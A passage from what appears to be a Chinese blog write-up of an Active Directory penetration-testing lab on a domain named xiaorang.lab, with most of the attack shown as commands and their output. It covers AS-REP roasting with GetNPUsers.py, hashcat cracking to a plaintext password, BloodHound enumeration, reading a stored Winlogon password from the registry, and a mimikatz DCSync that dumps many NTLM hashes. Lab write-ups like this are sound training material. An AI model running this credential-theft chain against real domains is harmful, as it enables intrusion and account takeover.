+</span></span><span class="line"><span class="cl">zouqi  
+</span></span><span class="line"><span class="cl">rongbiao  
+</span></span><span class="line"><span class="cl">gongxin  
+</span></span><span class="line"><span class="cl">luxing  
+</span></span><span class="line"><span class="cl">huayan  
+</span></span><span class="line"><span class="cl">duyue  
+</span></span><span class="line"><span class="cl">xijun  
+</span></span><span class="line"><span class="cl">daiqing  
+</span></span><span class="line"><span class="cl">yingbiao  
+</span></span><span class="line"><span class="cl">hengteng  
+</span></span><span class="line"><span class="cl">changwu  
+</span></span><span class="line"><span class="cl">chengying  
+</span></span><span class="line"><span class="cl">luhong  
+</span></span><span class="line"><span class="cl">tongxue  
+</span></span><span class="line"><span class="cl">xiangqian  
+</span></span><span class="line"><span class="cl">shaokang  
+</span></span><span class="line"><span class="cl">nongzhu  
+</span></span><span class="line"><span class="cl">haomei  
+</span></span><span class="line"><span class="cl">maoqing  
+</span></span><span class="line"><span class="cl">xiai  
+</span></span><span class="line"><span class="cl">bihe  
+</span></span><span class="line"><span class="cl">gaoli  
+</span></span><span class="line"><span class="cl">jianggong  
+</span></span><span class="line"><span class="cl">pangning  
+</span></span><span class="line"><span class="cl">ruishi  
+</span></span><span class="line"><span class="cl">wuhuan  
+</span></span><span class="line"><span class="cl">qiaode  
+</span></span><span class="line"><span class="cl">mayong  
+</span></span><span class="line"><span class="cl">hangda  
+</span></span><span class="line"><span class="cl">changlu  
+</span></span><span class="line"><span class="cl">liuyuan  
+</span></span><span class="line"><span class="cl">chenggu  
+</span></span><span class="line"><span class="cl">shentuyun  
+</span></span><span class="line"><span class="cl">zhuangsong  
+</span></span><span class="line"><span class="cl">chushao  
+</span></span><span class="line"><span class="cl">heli  
+</span></span><span class="line"><span class="cl">haoming  
+</span></span><span class="line"><span class="cl">xieyi  
+</span></span><span class="line"><span class="cl">shangjie  
+</span></span><span class="line"><span class="cl">situxin  
+</span></span><span class="line"><span class="cl">linxi  
+</span></span><span class="line"><span class="cl">zoufu  
+</span></span><span class="line"><span class="cl">qianqing  
+</span></span><span class="line"><span class="cl">qiai  
+</span></span><span class="line"><span class="cl">ruilin  
+</span></span><span class="line"><span class="cl">luomeng  
+</span></span><span class="line"><span class="cl">huaren  
+</span></span><span class="line"><span class="cl">yanyangmei  
+</span></span><span class="line"><span class="cl">zuofen  
+</span></span><span class="line"><span class="cl">manyuan  
+</span></span><span class="line"><span class="cl">yuhui  
+</span></span><span class="line"><span class="cl">sunli  
+</span></span><span class="line"><span class="cl">guansixin  
+</span></span><span class="line"><span class="cl">ruisong  
+</span></span><span class="line"><span class="cl">qiruo  
+</span></span><span class="line"><span class="cl">jinyu  
+</span></span><span class="line"><span class="cl">shoujuan  
+</span></span><span class="line"><span class="cl">yanqian  
+</span></span><span class="line"><span class="cl">changyun  
+</span></span><span class="line"><span class="cl">hualu  
+</span></span><span class="line"><span class="cl">huanming  
+</span></span><span class="line"><span class="cl">baoshao  
+</span></span><span class="line"><span class="cl">hongmei  
+</span></span><span class="line"><span class="cl">manyun  
+</span></span><span class="line"><span class="cl">changwan  
+</span></span><span class="line"><span class="cl">wangyan  
+</span></span><span class="line"><span class="cl">shijian  
+</span></span><span class="line"><span class="cl">ruibei  
+</span></span><span class="line"><span class="cl">jingshao  
+</span></span><span class="line"><span class="cl">jinzhi  
+</span></span><span class="line"><span class="cl">yuhui  
+</span></span><span class="line"><span class="cl">zangpeng  
+</span></span><span class="line"><span class="cl">changyun  
+</span></span><span class="line"><span class="cl">yetai  
+</span></span><span class="line"><span class="cl">luoxue  
+</span></span><span class="line"><span class="cl">moqian  
+</span></span><span class="line"><span class="cl">xupeng  
+</span></span><span class="line"><span class="cl">ruanyong  
+</span></span><span class="line"><span class="cl">guliangxian  
+</span></span><span class="line"><span class="cl">yinbin  
+</span></span><span class="line"><span class="cl">huarui  
+</span></span><span class="line"><span class="cl">niuya  
+</span></span><span class="line"><span class="cl">guwei  
+</span></span><span class="line"><span class="cl">qinguan  
+</span></span><span class="line"><span class="cl">yangdanhan  
+</span></span><span class="line"><span class="cl">yingjun  
+</span></span><span class="line"><span class="cl">weiwan  
+</span></span><span class="line"><span class="cl">sunduangu  
+</span></span><span class="line"><span class="cl">sisiwu  
+</span></span><span class="line"><span class="cl">nongyan  
+</span></span><span class="line"><span class="cl">xuanlu  
+</span></span><span class="line"><span class="cl">yunzhong  
+</span></span><span class="line"><span class="cl">gengfei  
+</span></span><span class="line"><span class="cl">zizhuansong  
+</span></span><span class="line"><span class="cl">ganbailong  
+</span></span><span class="line"><span class="cl">shenjiao  
+</span></span><span class="line"><span class="cl">zangyao  
+</span></span><span class="line"><span class="cl">yangdanhe  
+</span></span><span class="line"><span class="cl">chengliang  
+</span></span><span class="line"><span class="cl">xudi  
+</span></span><span class="line"><span class="cl">wulun  
+</span></span><span class="line"><span class="cl">yuling  
+</span></span><span class="line"><span class="cl">taoya  
+</span></span><span class="line"><span class="cl">jinle  
+</span></span><span class="line"><span class="cl">youchao  
+</span></span><span class="line"><span class="cl">liangduanzhi  
+</span></span><span class="line"><span class="cl">jiagupiao  
+</span></span><span class="line"><span class="cl">ganze  
+</span></span><span class="line"><span class="cl">jiangqing  
+</span></span><span class="line"><span class="cl">jinshan  
+</span></span><span class="line"><span class="cl">zhengpubei  
+</span></span><span class="line"><span class="cl">cuicheng  
+</span></span><span class="line"><span class="cl">qiyong  
+</span></span><span class="line"><span class="cl">qizhu  
+</span></span><span class="line"><span class="cl">ganjian  
+</span></span><span class="line"><span class="cl">yurui  
+</span></span><span class="line"><span class="cl">feishu  
+</span></span><span class="line"><span class="cl">chenxin  
+</span></span><span class="line"><span class="cl">shengzhe  
+</span></span><span class="line"><span class="cl">wohong  
+</span></span><span class="line"><span class="cl">manzhi  
+</span></span><span class="line"><span class="cl">xiangdong  
+</span></span><span class="line"><span class="cl">weihui  
+</span></span><span class="line"><span class="cl">xingquan  
+</span></span><span class="line"><span class="cl">miaoshu  
+</span></span><span class="line"><span class="cl">gongwan  
+</span></span><span class="line"><span class="cl">qijie  
+</span></span><span class="line"><span class="cl">shaoting  
+</span></span><span class="line"><span class="cl">xiqi  
+</span></span><span class="line"><span class="cl">jinghong  
+</span></span><span class="line"><span class="cl">qianyou  
+</span></span><span class="line"><span class="cl">chuhua  
+</span></span><span class="line"><span class="cl">yanyue  
+</span></span><span class="line"><span class="cl">huangjia  
+</span></span><span class="line"><span class="cl">zhouchun  
+</span></span><span class="line"><span class="cl">jiyu  
+</span></span><span class="line"><span class="cl">wendong  
+</span></span><span class="line"><span class="cl">heyuan  
+</span></span><span class="line"><span class="cl">mazhen  
+</span></span><span class="line"><span class="cl">shouchun  
+</span></span><span class="line"><span class="cl">liuzhe  
+</span></span><span class="line"><span class="cl">fengbo  
+</span></span><span class="line"><span class="cl">taigongyuan  
+</span></span><span class="line"><span class="cl">gesheng  
+</span></span><span class="line"><span class="cl">songming  
+</span></span><span class="line"><span class="cl">yuwan  
+</span></span><span class="line"><span class="cl">diaowei  
+</span></span><span class="line"><span class="cl">youyi  
+</span></span><span class="line"><span class="cl">rongxianyu  
+</span></span><span class="line"><span class="cl">fuyi  
+</span></span><span class="line"><span class="cl">linli  
+</span></span><span class="line"><span class="cl">weixue  
+</span></span><span class="line"><span class="cl">hejuan  
+</span></span><span class="line"><span class="cl">zuoqiutai  
+</span></span><span class="line"><span class="cl">siyi  
+</span></span><span class="line"><span class="cl">shenshan  
+</span></span><span class="line"><span class="cl">tongdong  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里可能是打<code>ASREProast</code>攻击<br>
+利用<code>impacket</code>中的脚本<code>GetNPUsers.py</code>，<code>KDC</code>在域控上面<code>172.22.6.12</code><br>
+<code>python3 GetNPUsers.py -dc-ip 172.22.6.12 -userfile user.txt xiaorang.lab/</code><br>
+枚举出了一个用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$krb5asrep$23$zhangxin@XIAORANG.LAB:879dbafb8ac57d6cdf507992634de168$63160bf204c403f508c94370f09b13e9dcda32fc53ffc2a24efb4ba0250963502a0dff86985071519c2f4e273c5b6f043f057175f1582d4697f75694bdce81e89386e7ac99182bd0ee12b870712b70cf02c96cf144d3ca47b37d62f3e01283dfcb3f53e4932e315ffa5cd7401f18c077c34e3c6503c11950e946e752049f6d44075244b7ee4ded5ca70a384beb2fdc893e9427646eda2fff8b385757820c1cc30cc60bb6483e3a8fb0a06005c77d2bbbc51c5b4eeabd28329f9486a15639cbffa9a6be387b24f23cc66d8c6ab5f7aee12fb4692081ef2146a923c8f1762e7bafb9d9cdf99cf23b50e4338e16  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>hashcat -m 18200 -a 0 --force '$krb5asrep$23$zhangxin@XIAORANG.LAB:e414f4692a6b1d0905e8ed118747ac6e$95ec406c7cdae081a496fe8009a23e684f0612d0632c903e1b34ce66275421c5d0f8125c8e651bf93ddee83bab492833c6af3316177096000e7e302359774ab66f05c254ad9c61ba9407756681e532c031f65961571469d15a08a069ea0ab26d38d876c2808055c0724c9b30dcc29ba9e62d56d8f697ea29d200f3c58bd107e8f39e16d34aa76dcb26d58e7d7e59a1d3160d249451a73fe6ba1a0d09d4a5210f2b6aeb09cf979a0ad51345244b21769878652f5c88223c4ed6648c650413bc31192e835cf74f274b20604a8e9ad3db6ec6e28f7b24452eaf7c456a7e4282e1bba9ffddc43915cfd1349c56a0' ./rockyou.txt</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282015356.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282015356.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282015356.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282015356.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282015356.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282015356.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+得到密码<br>
+<code>zhangxin@XIAORANG.LAB:strawberry</code><br>
+进行登陆<br>
+<code>172.22.6.25</code><br>
+收集一下域信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SharpHound.exe -c all  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用<code>BloodHound</code>进行分析<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282252122.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282252122.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282252122.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282252122.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282252122.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504282252122.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+其中<code>yuxuan</code>用户存在<code>滥用了SID历史功能</code><br>
+(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限<br>
+从上面可以看到<code>WIN2019.XIAORANG.LAB</code>这台机器上面存在着一个活跃的会话，正是<code>YUXUAN@XIAORANG.LAB</code>，利用<code>quser</code>查看到正在登录的用户，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\zhangxin&gt;quser  
+</span></span><span class="line"><span class="cl"> 用户名                会话名             ID  状态    空闲时间   登录时间  
+</span></span><span class="line"><span class="cl"> yuxuan                console             1  运行中      无     2025/4/28 12:27  
+</span></span><span class="line"><span class="cl">&gt;zhangxin              rdp-tcp#0           2  运行中          .  2025/4/28 13:03  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接拖密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    DefaultUserName    REG_SZ    yuxuan  
+</span></span><span class="line"><span class="cl">    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L  
+</span></span><span class="line"><span class="cl">    DefaultDomainName    REG_SZ    xiaorang.lab  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>登陆上这个用户，直接打<code>DCSync</code>即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">yuxuan</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span><span class="w"> </span><span class="s2">&#34;exit&#34;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="p">.</span><span class="c1">## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="s1">&#39;## v ##&#39;</span><span class="w">       </span><span class="n">Vincent</span><span class="w"> </span><span class="n">LE</span><span class="w"> </span><span class="nf">TOUX</span><span class="w">             </span><span class="p">(</span><span class="w"> </span><span class="n">vincent</span><span class="p">.</span><span class="n">letoux</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s1">&#39;#####&#39;</span><span class="w">        </span><span class="o">&gt;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="n">com</span><span class="w">   </span><span class="o">***/</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span><span class="w"> </span><span class="c1"># lsadump::dcsync /domain:xiaorang.lab /all /csv  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="n">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">&#39;xiaorang.lab&#39;</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">domain</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="n">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">&#39;DC-PROGAME.xiaorang.lab&#39;</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">DC</span><span class="w"> </span><span class="n">server</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="n">DC</span><span class="p">]</span><span class="w"> </span><span class="n">Exporting</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="s1">&#39;xiaorang.lab&#39;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1103</span><span class="w">    </span><span class="n">shuzhen</span><span class="w"> </span><span class="mi">07</span><span class="n">c1f387d7c2cf37e0ca7827393d2327</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1104</span><span class="w">    </span><span class="n">gaiyong</span><span class="w"> </span><span class="mi">52</span><span class="n">c909941c823dbe0f635b3711234d2e</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1106</span><span class="w">    </span><span class="n">xiqidi</span><span class="w">  </span><span class="n">a55d27cfa25f3df92ad558c304292f2e</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1107</span><span class="w">    </span><span class="n">wengbang</span><span class="w">        </span><span class="mi">6</span><span class="n">b1d97a5a68c6c6c9233d11274d13a2e</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1108</span><span class="w">    </span><span class="n">xuanjiang</span><span class="w">       </span><span class="n">a72a28c1a29ddf6509b8eabc61117c6c</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1109</span><span class="w">    </span><span class="n">yuanchang</span><span class="w">       </span><span class="n">e1cea038f5c9ffd9dc323daf35f6843b</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1110</span><span class="w">    </span><span class="n">lvhui</span><span class="w">   </span><span class="n">f58b31ef5da3fc831b4060552285ca54</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1111</span><span class="w">    </span><span class="n">wenbo</span><span class="w">   </span><span class="mi">9</span><span class="n">abb7115997ea03785e92542f684bdde</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1112</span><span class="w">    </span><span class="n">zhenjun</span><span class="w"> </span><span class="mi">94</span><span class="n">c84ba39c3ece24b419ab39fdd3de1a</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1113</span><span class="w">    </span><span class="n">jinqing</span><span class="w"> </span><span class="mi">4</span><span class="n">bf6ad7a2e9580bc8f19323f96749b3a</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1115</span><span class="w">    </span><span class="n">yangju</span><span class="w">  </span><span class="mi">1</span><span class="n">fa8c6b4307149415f5a1baffebe61cf</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1117</span><span class="w">    </span><span class="n">weicheng</span><span class="w">        </span><span class="mi">796</span><span class="n">a774eace67c159a65d6b86fea1d01</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1118</span><span class="w">    </span><span class="n">weixian</span><span class="w"> </span><span class="mi">8</span><span class="n">bd7dc83d84b3128bfbaf165bf292990</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1119</span><span class="w">    </span><span class="n">haobei</span><span class="w">  </span><span class="mi">045</span><span class="n">cc095cc91ba703c46aa9f9ce93df1</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1120</span><span class="w">    </span><span class="n">jizhen</span><span class="w">  </span><span class="mi">1840</span><span class="n">c5130e290816b55b4e5b60df10da</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1121</span><span class="w">    </span><span class="n">jingze</span><span class="w">  </span><span class="mi">3</span><span class="n">c8acaecc72f63a4be945ec6f4d6eeee</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1122</span><span class="w">    </span><span class="n">rubao</span><span class="w">   </span><span class="n">d8bd6484a344214d7e0cfee0fa76df74</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1123</span><span class="w">    </span><span class="n">zhaoxiu</span><span class="w"> </span><span class="mi">694</span><span class="n">c5c0ec86269daefff4dd611305fab</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1124</span><span class="w">    </span><span class="n">tangshun</span><span class="w">        </span><span class="mi">90</span><span class="n">b8d8b2146db6456d92a4a133eae225</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1125</span><span class="w">    </span><span class="n">liangliang</span><span class="w">      </span><span class="n">c67cd4bae75b82738e155df9dedab7c1</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1126</span><span class="w">    </span><span class="n">qiyue</span><span class="w">   </span><span class="n">b723d29e23f00c42d97dd97cc6b04bc8</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1127</span><span class="w">    </span><span class="n">chouqian</span><span class="w">        </span><span class="n">c6f0585b35de1862f324bc33c920328d</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1128</span><span class="w">    </span><span class="n">jicheng</span><span class="w"> </span><span class="mi">159</span><span class="n">ee55f1626f393de119946663a633c</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1129</span><span class="w">    </span><span class="n">xiyi</span><span class="w">    </span><span class="n">ee146df96b366efaeb5138832a75603b</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1130</span><span class="w">    </span><span class="n">beijin</span><span class="w">  </span><span class="n">a587b90ce9b675c9acf28826106d1d1d</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1131</span><span class="w">    </span><span class="n">chenghui</span><span class="w">        </span><span class="mi">08224236</span><span class="n">f9ddd68a51a794482b0e58b5</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1132</span><span class="w">    </span><span class="n">chebin</span><span class="w">  </span><span class="n">b50adfe07d0cef27ddabd4276b3c3168</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1133</span><span class="w">    </span><span class="n">pengyuan</span><span class="w">        </span><span class="n">a35d8f3c986ab37496896cbaa6cdfe3e</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1134</span><span class="w">    </span><span class="n">yanglang</span><span class="w">        </span><span class="mi">91</span><span class="n">c5550806405ee4d6f4521ba6e38f22</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1135</span><span class="w">    </span><span class="n">jihuan</span><span class="w">  </span><span class="n">cbe4d79f6264b71a48946c3fa94443f5</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1136</span><span class="w">    </span><span class="n">duanmuxiao</span><span class="w">      </span><span class="mi">494</span><span class="n">cc0e2e20d934647b2395d0a102fb0</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1137</span><span class="w">    </span><span class="n">hongzhi</span><span class="w"> </span><span class="n">f815bf5a1a17878b1438773dba555b8b</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1138</span><span class="w">    </span><span class="n">gaijin</span><span class="w">  </span><span class="n">b1040198d43631279a63b7fbc4c403af</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1139</span><span class="w">    </span><span class="n">yifu</span><span class="w">    </span><span class="mi">4836347</span><span class="n">be16e6af2cd746d3f934bb55a</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1140</span><span class="w">    </span><span class="n">fusong</span><span class="w">  </span><span class="n">adca7ec7f6ab1d2c60eb60f7dca81be7</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1141</span><span class="w">    </span><span class="n">luwan</span><span class="w">   </span><span class="n">c5b2b25ab76401f554f7e1e98d277a6a</span><span class="w">        </span><span class="mi">512</span><span class="w">  
